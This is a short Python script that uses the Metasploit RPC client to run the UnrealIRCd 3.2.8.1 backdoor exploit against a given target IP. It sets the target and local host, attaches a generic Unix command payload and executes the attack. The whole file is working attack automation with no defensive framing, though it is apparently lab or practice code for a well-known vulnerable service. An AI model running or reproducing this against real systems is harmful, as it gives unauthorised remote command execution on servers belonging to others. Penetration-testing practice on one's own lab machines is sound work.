from metasploit.msfrpc import MsfRpcClient

#Take in the following arguments: MsfRpcClient object, target IP address, and local IP address
def unix_unreal_ircd_backdoor(client:MsfRpcClient, target:str, lhost:str):

    # Create exploit variable that will later run our specified exploit
    exploit = client.modules.use('exploit', 'unix/irc/unreal_ircd_3281_backdoor')

    # Set value of RHOST within the exploit variable to the target IP address
    exploit['RHOST'] = target # IP of target host

    # Create a payload variable that will later run our specified payload
    ourPayload = client.modules.use('payload', 'cmd/unix/generic')

    # Set value of LHOST within the payload variable to the local IP address
    ourPayload['LHOST'] = lhost # IP of local host

    # Execute our exploit using our payload variable and set return variable to retVal
    retVal = exploit.execute(payload=ourPayload)

    return retVal
